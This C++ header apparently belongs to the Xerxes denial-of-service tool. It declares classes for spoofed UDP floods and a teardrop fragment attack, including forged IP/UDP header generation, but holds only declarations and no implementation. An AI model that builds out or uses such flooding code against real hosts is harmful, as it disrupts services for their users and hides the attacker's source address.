#ifndef XERXES_SPOOFED_UDP_FLOOD_H
#define XERXES_SPOOFED_UDP_FLOOD_H

#include "base_spoofed_flood.hpp"

#define __FAVOR_BSD
#include <netinet/ip.h>
#include <netinet/udp.h>

class spoofed_udp_flood : public base_spoofed_flood {
public:
  spoofed_udp_flood();
  ~spoofed_udp_flood() = default;

protected:
  char *gen_hdr(sockaddr_in *dst, int len) override;
  virtual void init_hdr(udphdr *udp, iphdr *ip);
  virtual void finalize_hdr(udphdr *udp, iphdr *ip);

  struct pshdr {
    u_int32_t saddr = 0;
    u_int32_t daddr = 0;
    u_int8_t zero = 0;
    u_int8_t proto = IPPROTO_UDP;
    u_int16_t len = 0;
    udphdr udp;
  };
};

class teardrop : public spoofed_udp_flood {

public:
  teardrop();
  ~teardrop() = default;

protected:
  void finalize_hdr(udphdr *udp, iphdr *ip) override;
};

#endif // XERXES_SPOOFED_UDP_FLOOD_H
